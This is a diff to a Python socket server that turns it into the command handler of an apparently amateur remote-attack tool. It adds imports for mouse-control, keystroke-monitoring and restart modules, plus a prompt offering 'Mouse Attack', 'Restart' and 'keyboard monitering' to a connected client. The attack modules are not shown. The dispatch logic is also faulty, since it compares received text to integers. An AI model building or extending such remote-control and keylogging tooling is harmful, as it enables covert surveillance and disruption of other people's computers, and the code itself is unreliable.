@@ -1,4 +1,5 @@
 import socket
+import MouseControl , KeyStrokes , Restart
 
 def start_server():
     # Create a socket object
@@ -13,7 +14,7 @@ def start_server():
     
     # Server listens for connections (max 5 connections in the queue)
     server_socket.listen(5)
-    print("Server is listening...")
+    print("Choose an option for attack: 1- Mouse Attack, 2- Restart, 3- keyboard monitering")
     
     # Accept the client connection
     client_socket, addr = server_socket.accept()
@@ -28,6 +29,17 @@ def start_server():
         
         print(f"Client: {client_message}")
         
+        if client_message == 1:
+            MouseControl.mouse_attack()
+        
+        if client_message == 2:
+            Restart.restart()
+        
+        if client_message == 3:
+            KeyStrokes.key_strokes()
+        
+        else:
+            pass
         # Send a response back to the client
         server_message = input("Server: ")
         client_socket.send(server_message.encode('utf-8'))
